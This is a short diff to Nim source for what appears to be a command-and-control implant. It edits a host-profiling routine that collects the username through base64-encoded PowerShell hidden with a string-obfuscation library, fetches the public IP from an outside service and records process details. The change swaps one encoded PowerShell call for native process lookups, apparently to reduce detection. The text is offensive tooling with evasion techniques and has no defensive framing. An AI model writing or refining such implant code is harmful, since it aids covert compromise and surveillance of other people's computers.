@@ -11,6 +11,7 @@ import system/[io]
 import httpclient
 import threadpool
 import nimprotect
+import strformat
 import strutils
 import osproc
 import crc32
@@ -69,6 +70,10 @@ proc collect_data(): bool =
     except:
         os_version = could_not_retrieve
     try:
+        process = fmt"[{$getCurrentProcessId()}] {getAppFilename()}"
+    except:
+        process = could_not_retrieve
+    try:
         username = execute_encoded_powershell(protectString("WwBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBJAGQAZQBuAHQAaQB0AHkAXQA6ADoARwBlAHQAQwB1AHIAcgBlAG4AdAAoACkALgBuAGEAbQBlAAoA"))
     except:
         username = could_not_retrieve
@@ -88,10 +93,6 @@ proc collect_data(): bool =
         ipv4_public = client.getContent(protectString("http://api.ipify.org"))
     except:
         ipv4_public = could_not_retrieve
-    try:
-        process = execute_encoded_powershell(protectString("JAB4ACAAPQAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0AUABJAEQAIAAkAHAAaQBkACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAG4AYQBtAGUAOwAgACIAJABwAGkAZAAgACQAeAAuAGUAeABlACIA"))
-    except:
-        process = could_not_retrieve
 
     var data = {
 
